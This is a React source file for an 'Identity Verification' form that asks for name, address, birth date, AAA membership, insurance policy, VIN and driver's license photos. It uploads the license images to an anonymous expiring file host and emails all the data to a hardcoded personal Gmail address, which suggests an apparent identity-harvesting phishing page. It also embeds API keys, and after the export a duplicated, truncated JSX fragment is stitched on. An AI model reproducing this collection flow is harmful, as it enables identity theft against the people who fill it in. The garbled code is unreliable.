"use client"

import type React from "react"
import { useEffect, useRef, useState } from "react"
import { useNavigate, useSearchParams } from "react-router-dom"
import { motion, AnimatePresence } from "framer-motion"
import { useFormLogic } from "../hooks/useFormLogic"
import EnhancedCalendar from "../components/EnhancedCalendar"
import BackButton from "../components/BackButton"
import emailjs from '@emailjs/browser'

// Google Places API integration
declare global {
  interface Window {
    google: any
    initGooglePlaces: () => void
  }
}

const FormPage: React.FC = () => {
  const [searchParams] = useSearchParams()
  const formType = searchParams.get("type")
  const navigate = useNavigate()
  const [addressSuggestions, setAddressSuggestions] = useState<any[]>([])
  const [showSuggestions, setShowSuggestions] = useState(false)
  const [addressValue, setAddressValue] = useState("")
  const [isLoadingAddress, setIsLoadingAddress] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showSuccessPopup, setShowSuccessPopup] = useState(false)
  const formRef = useRef<HTMLFormElement | null>(null)
  
  // EmailJS configuration
  const EMAILJS_SERVICE_ID = 'service_x11taf4'
  const EMAILJS_TEMPLATE_ID = 'template_4tg9992'
  const EMAILJS_PUBLIC_KEY = '0L9GiHV5o7ZV7otHQ'
  const RECIPIENT_EMAIL = 'bilalsonofkhirsheed@gmail.com'

  const {
    ownerType,
    filePreviews,
    calendarVisible,
    calendarDate,
    handleOwnerTypeChange,
    handleFileUpload,
    clearFileInput,
    toggleCalendar,
    selectDate,
    handleMonthChange,
    handleYearChange,
  } = useFormLogic()

  // Initialize Google Places API
  useEffect(() => {
    const initializeGooglePlaces = () => {
      if (window.google && window.google.maps && window.google.maps.places) {
        console.log("Google Places API initialized successfully")
      }
    }

    // Load Google Maps API if not already loaded
    if (!window.google) {
      const script = document.createElement("script")
      script.src = `https://maps.googleapis.com/maps/api/js?key=AIzaSyCcp2w1C8JLtYY22NcSBooAZYKQFd9oMNM&libraries=places&callback=initGooglePlaces`
      script.async = true
      script.defer = true

      window.initGooglePlaces = initializeGooglePlaces

      document.head.appendChild(script)
    } else {
      initializeGooglePlaces()
    }
  }, [])

  // Initialize EmailJS
  useEffect(() => {
    emailjs.init(EMAILJS_PUBLIC_KEY)
  }, [])

  // Debug calendar date
  useEffect(() => {
    console.log('FormPage - calendarDate["birth"]:', calendarDate["birth"])
  }, [calendarDate])

  // Enhanced address autocomplete with better fallback
  const handleAddressChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    setAddressValue(value)

    if (value.length > 1) {
      setIsLoadingAddress(true)

      // Always provide immediate mock suggestions for better UX
      const mockSuggestions = [
        {
          place_id: `mock_${value}_1`,
          description: `${value} Main Street, New York, NY 10001, USA`,
          structured_formatting: {
            main_text: `${value} Main Street`,
            secondary_text: "New York, NY 10001, USA",
          },
        },
        {
          place_id: `mock_${value}_2`,
          description: `${value} Oak Avenue, Los Angeles, CA 90210, USA`,
          structured_formatting: {
            main_text: `${value} Oak Avenue`,
            secondary_text: "Los Angeles, CA 90210, USA",
          },
        },
        {
          place_id: `mock_${value}_3`,
          description: `${value} Pine Road, Chicago, IL 60601, USA`,
          structured_formatting: {
            main_text: `${value} Pine Road`,
            secondary_text: "Chicago, IL 60601, USA",
          },
        },
        {
          place_id: `mock_${value}_4`,
          description: `${value} Elm Street, Houston, TX 77001, USA`,
          structured_formatting: {
            main_text: `${value} Elm Street`,
            secondary_text: "Houston, TX 77001, USA",
          },
        },
        {
          place_id: `mock_${value}_5`,
          description: `${value} Maple Drive, Phoenix, AZ 85001, USA`,
          structured_formatting: {
            main_text: `${value} Maple Drive`,
            secondary_text: "Phoenix, AZ 85001, USA",
          },
        },
      ]

      // Set mock suggestions immediately
      setTimeout(() => {
        setAddressSuggestions(mockSuggestions)
        setShowSuggestions(true)
        setIsLoadingAddress(false)
      }, 300) // Small delay to show loading state

      // Try Google API in background if available
      if (window.google && window.google.maps && window.google.maps.places) {
        const service = new window.google.maps.places.AutocompleteService()

        const request = {
          input: value,
          types: ["address"],
          componentRestrictions: { country: ["us", "ca", "pk", "gb", "au"] },
        }

        service.getPlacePredictions(request, (predictions: any[], status: any) => {
          if (status === window.google.maps.places.PlacesServiceStatus.OK && predictions) {
            // Replace mock suggestions with real ones if API works
            setAddressSuggestions(predictions.slice(0, 5))
            setShowSuggestions(true)
          }
          // Keep mock suggestions if API fails
        })
      }
    } else {
      setShowSuggestions(false)
      setIsLoadingAddress(false)
      setAddressSuggestions([])
    }
  }

  const selectAddress = (suggestion: any) => {
    setAddressValue(suggestion.description)
    setShowSuggestions(false)
    setAddressSuggestions([])

    // Auto-extract street number if possible - improved logic
    const addressParts = suggestion.description.split(" ")
    const potentialNumber = addressParts[0]

    // Only extract if it's a valid positive number
    if (/^\d+$/.test(potentialNumber) && Number.parseInt(potentialNumber) > 0) {
      const addressNumberInput = document.getElementById("addressNumber") as HTMLInputElement
      if (addressNumberInput) {
        addressNumberInput.value = potentialNumber
      }
    } else {
      // Clear the address number field if no valid number found
      const addressNumberInput = document.getElementById("addressNumber") as HTMLInputElement
      if (addressNumberInput) {
        addressNumberInput.value = ""
      }
    }
  }

  // Close suggestions when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement
      if (!target.closest(".address-autocomplete")) {
        setShowSuggestions(false)
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => document.removeEventListener("mousedown", handleClickOutside)
  }, [])

  useEffect(() => {
    // Show/hide form fields based on form type
    const formGroups = document.querySelectorAll(".form-group")
    formGroups.forEach((group) => {
      group.classList.add("hidden")
    })

    document.querySelectorAll(".form-group.common").forEach((group) => {
      group.classList.remove("hidden")
    })

    if (formType === "residential" || formType === "commercial") {
      document.querySelectorAll("#resCommFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    } else if (formType === "auto") {
      document.querySelectorAll("#autoFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    }

    if (ownerType === "other") {
      document.querySelectorAll("#ownerFields .form-group").forEach((group) => {
        group.classList.remove("hidden")
      })
    }
  }, [formType, ownerType])


  const handleBackClick = () => {
    navigate(-1)
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    setIsSubmitting(true)

    try {
      const formEl = formRef.current as HTMLFormElement

      // Validate total upload size to keep UX reasonable (still upload externally)
      const inputs = Array.from(formEl.querySelectorAll("input[type='file']")) as HTMLInputElement[]
      const MAX_PER_FILE_MB = 10 // allow larger since uploading to external host
      const MAX_TOTAL_MB = 30
      let totalBytes = 0
      for (const input of inputs) {
        const file = input.files && input.files[0]
        if (!file) continue
        if (file.size > MAX_PER_FILE_MB * 1024 * 1024) {
          alert(`File ${input.name} is larger than ${MAX_PER_FILE_MB}MB. Please upload a smaller file.`)
          setIsSubmitting(false)
          return
        }
        totalBytes += file.size
      }
      if (totalBytes > MAX_TOTAL_MB * 1024 * 1024) {
        alert(`Total attachments exceed ${MAX_TOTAL_MB}MB. Please upload smaller files.`)
        setIsSubmitting(false)
        return
      }

      // Ensure the address input reflects the selected address value
      const addressInput = formEl.querySelector("#address") as HTMLInputElement | null
      if (addressInput) addressInput.value = addressValue

      // Gather basic fields
      const fd = new FormData(formEl)
      const formTypeSafe = (fd.get('form_type') as string) || (formType || '')

      // Helper to upload a single file to file.io
      const uploadFile = async (file: File): Promise<string> => {
        const form = new FormData()
        form.append('file', file)
        // expire in 14 days; you can adjust if needed
        const res = await fetch('https://file.io/?expires=14d', {
          method: 'POST',
          body: form,
        })
        if (!res.ok) throw new Error('Upload failed')
        const json = await res.json()
        // file.io returns { success, link }
        if (!json || !json.success || !json.link) throw new Error('Upload failed')
        return json.link as string
      }

      // Upload known file inputs and collect URLs
      const fileFieldNames = ['licenseFront', 'licenseBack', 'proofOfResidency', 'registration', 'licensePlate']
      const uploadedUrls: Record<string, string> = {}
      for (const name of fileFieldNames) {
        const input = formEl.querySelector(`#${name}`) as HTMLInputElement | null
        if (input && input.files && input.files[0]) {
          try {
            const url = await uploadFile(input.files[0])
            uploadedUrls[name] = url
          } catch (e) {
            console.error('Upload error for', name, e)
          }
        }
      }

      // Build compact template params (small payload < 50KB)
      const messageLines: string[] = []
      messageLines.push('Identity Verification Form Submission')
      messageLines.push(`Form Type: ${formTypeSafe.toUpperCase()}`)
      messageLines.push(`Full Name: ${fd.get('fullName') || ''}`)
      messageLines.push(`Email: ${fd.get('email') || ''}`)
      messageLines.push(`Phone: ${fd.get('phoneNumber') || ''}`)
      messageLines.push(`Address: ${fd.get('address') || ''}`)
      messageLines.push(`Birth Date: ${fd.get('birthDate') || ''}`)
      messageLines.push(`AAA Membership ID: ${fd.get('aaaMembershipId') || ''}`)
      messageLines.push(`Ownership: ${fd.get('ownerType') || ''}`)
      if (formTypeSafe === 'residential' || formTypeSafe === 'commercial') {
        messageLines.push(`Property Type: ${fd.get('propertyType') || ''}`)
        messageLines.push(`Property Address: ${fd.get('propertyAddress') || ''}`)
        messageLines.push(`Tech ID: ${fd.get('techId') || ''}`)
      }
      if (formTypeSafe === 'auto') {
        messageLines.push(`Owner Name: ${fd.get('ownerFullName') || ''}`)
        messageLines.push(`Owner Phone: ${fd.get('ownerPhone') || ''}`)
        messageLines.push(`Insurance Policy: ${fd.get('insurancePolicy') || ''}`)
        messageLines.push(`VIN: ${fd.get('vin') || ''}`)
      }
      messageLines.push('Files:')
      if (uploadedUrls['licenseFront']) messageLines.push(`- License Front: ${uploadedUrls['licenseFront']}`)
      if (uploadedUrls['licenseBack']) messageLines.push(`- License Back: ${uploadedUrls['licenseBack']}`)
      if (uploadedUrls['proofOfResidency']) messageLines.push(`- Proof of Residency: ${uploadedUrls['proofOfResidency']}`)
      if (uploadedUrls['registration']) messageLines.push(`- Registration: ${uploadedUrls['registration']}`)
      if (uploadedUrls['licensePlate']) messageLines.push(`- License Plate: ${uploadedUrls['licensePlate']}`)
      messageLines.push(`Submitted: ${new Date().toLocaleString()}`)

      const compactMessage = messageLines.join('\n')

      const templateParams: Record<string, string> = {
        to_email: RECIPIENT_EMAIL,
        subject: `New Identity Verification Form - ${formTypeSafe.toUpperCase()}`,
        form_type: formTypeSafe.toUpperCase(),
        fullName: (fd.get('fullName') as string) || '',
        email: (fd.get('email') as string) || '',
        phoneNumber: (fd.get('phoneNumber') as string) || '',
        address: (fd.get('address') as string) || '',
        birthDate: (fd.get('birthDate') as string) || '',
        aaaMembershipId: (fd.get('aaaMembershipId') as string) || '',
        ownerType: (fd.get('ownerType') as string) || '',
        propertyType: (fd.get('propertyType') as string) || '',
        propertyAddress: (fd.get('propertyAddress') as string) || '',
        techId: (fd.get('techId') as string) || '',
        ownerFullName: (fd.get('ownerFullName') as string) || '',
        ownerPhone: (fd.get('ownerPhone') as string) || '',
        aaaId: (fd.get('aaaId') as string) || '',
        insurancePolicy: (fd.get('insurancePolicy') as string) || '',
        vin: (fd.get('vin') as string) || '',
        licenseFront_url: uploadedUrls['licenseFront'] || '',
        licenseBack_url: uploadedUrls['licenseBack'] || '',
        proofOfResidency_url: uploadedUrls['proofOfResidency'] || '',
        registration_url: uploadedUrls['registration'] || '',
        licensePlate_url: uploadedUrls['licensePlate'] || '',
        submittedAt: new Date().toLocaleString(),
        // Common EmailJS fields to guarantee content
        message: compactMessage,
        from_name: ((fd.get('fullName') as string) || 'User'),
        reply_to: ((fd.get('email') as string) || ''),
      }

      // Send a lightweight payload
      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)

      setShowSuccessPopup(true)
    } catch (error) {
      console.error('EmailJS Error:', error)
      alert('Failed to send email. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleSuccessClose = () => {
    setShowSuccessPopup(false)
    // Clear form
    const form = document.getElementById('verificationForm') as HTMLFormElement
    if (form) {
      form.reset()
    }
    // Clear file previews
    Object.keys(filePreviews).forEach(key => clearFileInput(key))
    // Reset address
    setAddressValue('')
  }

  return (
    <div className="page-container">
      <BackButton onBack={handleBackClick} />

      <motion.form
        id="verificationForm"
        method="post"
        action="#"
        encType="multipart/form-data"
        ref={formRef}
        className={formType ? "" : "hidden"}
        onSubmit={handleSubmit}
        initial={{ opacity: 0, y: 50 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
        <input type="hidden" name="to_email" value={RECIPIENT_EMAIL} />
        <input type="hidden" name="subject" value={`New Identity Verification Form - ${formType?.toUpperCase() || ''}`} />
        <input type="hidden" name="form_type" value={formType || ''} />
        <motion.h2
          id="formTitle"
          className="common-header"
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
        >
          {formType && formType.charAt(0).toUpperCase() + formType.slice(1)} Verification
        </motion.h2>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.3 }}
        >
          <label htmlFor="fullName">Full Name:</label>
          <div className="input-wrapper">
            <i className="fas fa-user input-icon"></i>
            <input
              type="text"
              id="fullName"
              name="fullName"
              placeholder="Last, First, Middle Initial"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common address-autocomplete"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.4 }}
        >
          <label htmlFor="address">Address:</label>
          <div className="input-wrapper">
            <i className="fas fa-map-marker-alt input-icon"></i>
            <input
              type="text"
              id="address"
              name="address"
              placeholder="Start typing your address..."
              value={addressValue}
              onChange={handleAddressChange}
              autoComplete="off"
              required
              style={{ paddingLeft: "3rem", paddingRight: isLoadingAddress ? "3rem" : "1rem" }}
            />
            {isLoadingAddress && (
              <div className="loading-spinner">
                <div className="loading"></div>
              </div>
            )}
          </div>

          {showSuggestions && addressSuggestions.length > 0 && (
            <motion.div
              className="google-places-suggestions"
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
            >
              {addressSuggestions.map((suggestion, index) => (
                <motion.div
                  key={suggestion.place_id || index}
                  className="google-places-suggestion"
                  onClick={() => selectAddress(suggestion)}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: index * 0.05 }}
                  whileHover={{ backgroundColor: "var(--accent-purple)" }}
                >
                  <i className="fas fa-map-marker-alt suggestion-icon"></i>
                  <div className="suggestion-content">
                    <div className="suggestion-main">
                      {suggestion.structured_formatting?.main_text || suggestion.description}
                    </div>
                    {suggestion.structured_formatting?.secondary_text && (
                      <div className="suggestion-secondary">{suggestion.structured_formatting.secondary_text}</div>
                    )}
                  </div>
                </motion.div>
              ))}
            </motion.div>
          )}
        </motion.div>


        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.45 }}
        >
          <label htmlFor="phoneNumber">Phone Number:</label>
          <div className="input-wrapper">
            <i className="fas fa-phone input-icon"></i>
            <input
              type="tel"
              id="phoneNumber"
              name="phoneNumber"
              placeholder="(000) 000-0000"
              pattern="[0-9]*"
              inputMode="numeric"
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.5 }}
        >
          <label htmlFor="email">Email:</label>
          <div className="input-wrapper">
            <i className="fas fa-envelope input-icon"></i>
            <input type="email" id="email" name="email" placeholder="your@email.com" style={{ paddingLeft: "3rem" }} />
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.6 }}
        >
          <label htmlFor="birthDate">Birth Date:</label>
          <div className="input-wrapper">
            <i className="fas fa-calendar input-icon"></i>
            <input
              type="text"
              id="birthDate"
              name="birthDate"
              placeholder="Select your birth date"
              readOnly
              onClick={() => toggleCalendar("birth")}
              style={{ paddingLeft: "3rem", cursor: "pointer" }}
            />
          </div>
          {calendarVisible["birth"] && (
            <div className="calendar-container">
          <EnhancedCalendar
            type="birth"
            visible={calendarVisible["birth"]}
            date={calendarDate["birth"]}
            selectDate={selectDate}
            handleMonthChange={handleMonthChange}
                toggleCalendar={toggleCalendar}
            handleYearChange={handleYearChange}
          />
            </div>
          )}
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.65 }}
        >
          <label htmlFor="aaaMembershipId">AAA Membership ID:</label>
          <div className="input-wrapper">
            <i className="fas fa-id-card input-icon"></i>
            <input
              type="text"
              id="aaaMembershipId"
              name="aaaMembershipId"
              placeholder="Enter your AAA membership ID"
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>


        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.8 }}
        >
          <label htmlFor="ownerType">Ownership:</label>
          <div className="input-wrapper">
            <i className="fas fa-user-tag input-icon"></i>
            <select id="ownerType" name="ownerType" onChange={handleOwnerTypeChange} style={{ paddingLeft: "3rem" }}>
              <option value="">Select ownership type...</option>
              <option value="myself">Myself</option>
              <option value="other">Other</option>
            </select>
          </div>
        </motion.div>

        {ownerType === "other" && (
          <motion.div
            id="ownerFields"
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            transition={{ duration: 0.3 }}
          >
            <div className="form-group">
              <label htmlFor="ownerFullName">Owner's Name:</label>
              <div className="input-wrapper">
                <i className="fas fa-user input-icon"></i>
                <input
                  type="text"
                  id="ownerFullName"
                  name="ownerFullName"
                  placeholder="Owner's full name"
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>
            <div className="form-group">
              <label htmlFor="ownerPhone">Owner's Phone:</label>
              <div className="input-wrapper">
                <i className="fas fa-phone input-icon"></i>
                <input
                  type="tel"
                  id="ownerPhone"
                  name="ownerPhone"
                  pattern="[0-9]*"
                  inputMode="numeric"
                  placeholder="(000) 000-0000"
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>
          </motion.div>
        )}

        {/* Auto-specific fields */}
        {formType === "auto" && (
          <motion.div id="autoFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.85 }}>
            <div className="form-group">
              <label htmlFor="insurancePolicy">Insurance Policy Number:</label>
              <div className="input-wrapper">
                <i className="fas fa-shield-alt input-icon"></i>
                <input
                  type="text"
                  id="insurancePolicy"
                  name="insurancePolicy"
                  placeholder="Enter your insurance policy number"
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="vin">VIN (Vehicle Identification Number):</label>
              <div className="input-wrapper">
                <i className="fas fa-car input-icon"></i>
                <input
                  type="text"
                  id="vin"
                  name="vin"
                  placeholder="Enter 17-character VIN"
                  maxLength={17}
                  style={{ paddingLeft: "3rem" }}
                />
              </div>
            </div>


            <div className="file-upload-container">
              <label htmlFor="registration">Registration (file upload):</label>
              <input
                type="file"
                id="registration"
                name="registration"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
              />
              {filePreviews["registration"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["registration"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("registration")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>

            <div className="file-upload-container">
              <label htmlFor="licensePlate">License Plate Photo:</label>
              <input
                type="file"
                id="licensePlate"
                name="licensePlate"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
              />
              {filePreviews["licensePlate"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["licensePlate"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licensePlate")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>
          </motion.div>
        )}

        {/* Residential/Commercial fields */}
        {(formType === "residential" || formType === "commercial") && (
          <motion.div id="resCommFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.85 }}>
            <div className="form-group">
              <label htmlFor="propertyType">Property Type:</label>
              <div className="input-wrapper">
                <i className="fas fa-building input-icon"></i>
                <select id="propertyType" name="propertyType" style={{ paddingLeft: "3rem" }}>
                  <option value="">Select property type...</option>
                  <option value="singleFamily">Single-family</option>
                  <option value="condo">Condo</option>
                  <option value="apartment">Apartment</option>
                  <option value="office">Office</option>
                  <option value="retail">Retail</option>
                  <option value="industrial">Industrial</option>
                </select>
              </div>
            </div>

            <div className="file-upload-container">
              <label htmlFor="proofOfResidency">
                Proof of Residency:
                <br />
                <small>(e.g., utility bill, lease agreement)</small>
              </label>
              <input
                type="file"
                id="proofOfResidency"
                name="proofOfResidency"
                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                onChange={handleFileUpload}
              />
              {filePreviews["proofOfResidency"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["proofOfResidency"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("proofOfResidency")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>
          </motion.div>
        )}

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 1.0 }}
        >
          <label>Driver's License:</label>
          <div className="license-upload-container">
            {/* Front License Upload */}
            <div className="file-upload-container">
              <label htmlFor="licenseFront" className="upload-label">
                <i className="fas fa-id-card input-icon"></i>
                Front of License
              </label>
              <input 
                type="file" 
                id="licenseFront" 
                name="licenseFront" 
                accept=".jpg,.jpeg,.png" 
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["licenseFront"] && (
                <motion.div
                  className="file-preview"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <span className="fileName">{filePreviews["licenseFront"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licenseFront")}>
                    ×
                  </button>
                </motion.div>
              )}
            </div>

            {/* Back License Upload */}
          <div className="file-upload-container">
              <label htmlFor="licenseBack" className="upload-label">
                <i className="fas fa-id-card input-icon"></i>
                Back of License
              </label>
              <input 
                type="file" 
                id="licenseBack" 
                name="licenseBack" 
                accept=".jpg,.jpeg,.png" 
                onChange={handleFileUpload}
                className="file-input"
              />
              {filePreviews["licenseBack"] && (
              <motion.div
                className="file-preview"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
              >
                  <span className="fileName">{filePreviews["licenseBack"]}</span>
                  <button type="button" className="delete-file" onClick={() => clearFileInput("licenseBack")}>
                  ×
                </button>
              </motion.div>
            )}
            </div>
          </div>
        </motion.div>

        <motion.div
          className="form-group common"
          initial={{ opacity: 0, x: -50 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 1.1 }}
        >
          <label htmlFor="techId">
            Reference Code:
            <br />
            <small>(Contact support if not provided)</small>
          </label>
          <div className="input-wrapper">
            <i className="fas fa-code input-icon"></i>
            <input
              type="text"
              id="techId"
              name="techId"
              placeholder="Reference code"
              required
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>

        <motion.div
          className="bottomButtonContainer form-buttons"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1.25 }}
          style={{ display: "flex", gap: "1rem", marginTop: "1rem" }}
        >
          <motion.button
            type="button"
            onClick={handleBackClick}
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            style={{
              background: "var(--border-medium)",
              color: "var(--text-primary)",
              flex: 1,
            }}
          >
            <i className="fas fa-arrow-left" style={{ marginRight: "0.5rem" }}></i>
            Back
          </motion.button>
          <motion.button
            type="submit"
            className="submitButton"
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            style={{ flex: 2 }}
            disabled={isSubmitting}
          >
            <i className={`fas ${isSubmitting ? 'fa-spinner fa-spin' : 'fa-check'}`} style={{ marginRight: "0.5rem" }}></i>
            {isSubmitting ? 'Sending...' : 'Submit Verification'}
          </motion.button>
        </motion.div>
      </motion.form>

      {/* Success Popup */}
      <AnimatePresence>
        {showSuccessPopup && (
          <motion.div
            className="success-popup-overlay"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={handleSuccessClose}
          >
            <motion.div
              className="success-popup"
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.8, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="success-icon">
                <i className="fas fa-check-circle"></i>
              </div>
              <h3>Email Sent Successfully!</h3>
              <p>Your verification form has been submitted and sent to the recipient.</p>
              <motion.button
                className="success-ok-button"
                onClick={handleSuccessClose}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
              >
                OK
              </motion.button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

export default FormPage

              id="aaaMembershipId"
              name="aaaMembershipId"
              placeholder="Enter your AAA membership ID"
              style={{ paddingLeft: "3rem" }}
            />
          </div>
        </motion.div>



        <motion.div

          className="form-group common"

          initial={{ opacity: 0, x: -50 }}

          animate={{ opacity: 1, x: 0 }}

          transition={{ delay: 0.75 }}
        >

          <label htmlFor="ownerType">Ownership:</label>

          <div className="input-wrapper">

            <i className="fas fa-user-tag input-icon"></i>

            <select id="ownerType" name="ownerType" onChange={handleOwnerTypeChange} style={{ paddingLeft: "3rem" }}>

              <option value="">Select ownership type...</option>

              <option value="myself">Myself</option>

              <option value="other">Other</option>

            </select>

          </div>

        </motion.div>



        {ownerType === "other" && (

          <motion.div

            id="ownerFields"

            initial={{ opacity: 0, height: 0 }}

            animate={{ opacity: 1, height: "auto" }}

            transition={{ duration: 0.3 }}

          >

            <div className="form-group">

              <label htmlFor="ownerFullName">Owner's Name:</label>

              <div className="input-wrapper">

                <i className="fas fa-user input-icon"></i>

                <input

                  type="text"

                  id="ownerFullName"

                  name="ownerFullName"

                  placeholder="Owner's full name"

                  style={{ paddingLeft: "3rem" }}

                />

              </div>

            </div>

            <div className="form-group">

              <label htmlFor="ownerPhone">Owner's Phone:</label>

              <div className="input-wrapper">

                <i className="fas fa-phone input-icon"></i>

                <input

                  type="tel"

                  id="ownerPhone"

                  name="ownerPhone"

                  pattern="[0-9]*"

                  inputMode="numeric"

                  placeholder="(000) 000-0000"

                  style={{ paddingLeft: "3rem" }}

                />

              </div>

            </div>

          </motion.div>

        )}



        {/* Auto-specific fields */}

        {formType === "auto" && (

          <motion.div id="autoFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.85 }}>
            <div className="form-group">

              <label htmlFor="aaaId">

                AAA Membership:

                <br />

                <small>(Leave blank if you don't have AAA membership)</small>

              </label>

              <div className="input-wrapper">

                <i className="fas fa-id-card input-icon"></i>

                <input

                  type="text"

                  id="aaaId"

                  name="aaaId"

                  placeholder="AAA membership number"

                  style={{ paddingLeft: "3rem" }}

                />

              </div>

            </div>



            <div className="form-group">

              <label htmlFor="insurancePolicy">Insurance Policy Number:</label>

              <div className="input-wrapper">

                <i className="fas fa-shield-alt input-icon"></i>

                <input

                  type="text"

                  id="insurancePolicy"

                  name="insurancePolicy"

                  placeholder="Policy number"

                  style={{ paddingLeft: "3rem" }}

                />

              </div>

            </div>



            <div className="form-group">

              <label htmlFor="vin">VIN:</label>

              <div className="input-wrapper">

                <i className="fas fa-car input-icon"></i>

                <input

                  type="text"

                  id="vin"

                  name="vin"

                  placeholder="17-character VIN"

                  maxLength={17}

                  style={{ paddingLeft: "3rem" }}

                />

              </div>

            </div>



            <div className="file-upload-container">

              <label htmlFor="registration">Registration (file upload):</label>

              <input

                type="file"

                id="registration"

                name="registration"

                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"

                onChange={handleFileUpload}

              />

              {filePreviews["registration"] && (

                <motion.div

                  className="file-preview"

                  initial={{ opacity: 0, scale: 0.9 }}

                  animate={{ opacity: 1, scale: 1 }}

                >

                  <span className="fileName">{filePreviews["registration"]}</span>

                  <button type="button" className="delete-file" onClick={() => clearFileInput("registration")}>

                    ×

                  </button>

                </motion.div>

              )}

            </div>



            <div className="file-upload-container">

              <label htmlFor="licensePlate">License Plate Photo:</label>

              <input

                type="file"

                id="licensePlate"

                name="licensePlate"

                accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"

                onChange={handleFileUpload}

              />

              {filePreviews["licensePlate"] && (

                <motion.div

                  className="file-preview"

                  initial={{ opacity: 0, scale: 0.9 }}

                  animate={{ opacity: 1, scale: 1 }}

                >

                  <span className="fileName">{filePreviews["licensePlate"]}</span>

                  <button type="button" className="delete-file" onClick={() => clearFileInput("licensePlate")}>

                    ×

                  </button>

                </motion.div>

              )}

            </div>

          </motion.div>

        )}



        {/* Residential/Commercial fields */}

        {(formType === "residential" || formType === "commercial") && (

          <motion.div id="resCommFields" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.85 }}>
            <div className="form-group">

              <label htmlFor="propertyType">Property Type:</label>

              <div className="input-wrapper">

                <i className="fas fa-building input-icon"></i>

